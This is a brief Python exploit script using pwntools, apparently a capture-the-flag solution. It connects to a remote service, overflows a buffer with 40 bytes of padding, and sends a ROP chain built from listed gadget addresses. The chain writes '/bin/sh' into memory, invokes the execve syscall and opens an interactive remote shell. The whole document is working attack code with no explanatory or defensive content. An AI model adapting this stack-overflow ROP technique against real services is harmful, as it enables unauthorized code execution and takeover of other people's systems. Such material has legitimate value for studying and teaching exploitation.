from pwn import *


r = remote("exp.zip", 56004)



'''
0x000000000044fcc7 : pop rax ; ret
0x0000000000401e8f : pop rdi ; ret
0x0000000000409ebe : pop rsi ; ret
0x0000000000485aeb : pop rdx ; pop rbx ; ret

0x0000000000433403 : mov qword ptr [rdi], rdx ; ret

0000000000401C44     syscall   
'''


poprax = p64(0x44fcc7)
poprdi = p64(0x401e8f)
poprsi = p64(0x409ebe)
poprdx = p64(0x485aeb)
mem_addr = p64(0x4c8000)
w2m = p64(0x433403)
syscall = p64(0x401C44)


rop = poprdx
rop += b'/bin/sh\x00'
rop += p64(0x0)
rop += poprdi
rop += mem_addr
rop += w2m


rop += poprax
rop += p64(0x3b)

rop += poprsi
rop += p64(0x0)

rop += poprdx
rop += p64(0x0)
rop += p64(0x0)

rop += syscall


payload = b"A"*40 + rop

r.recvuntil(b"Data:")

r.sendline(payload)

r.interactive()
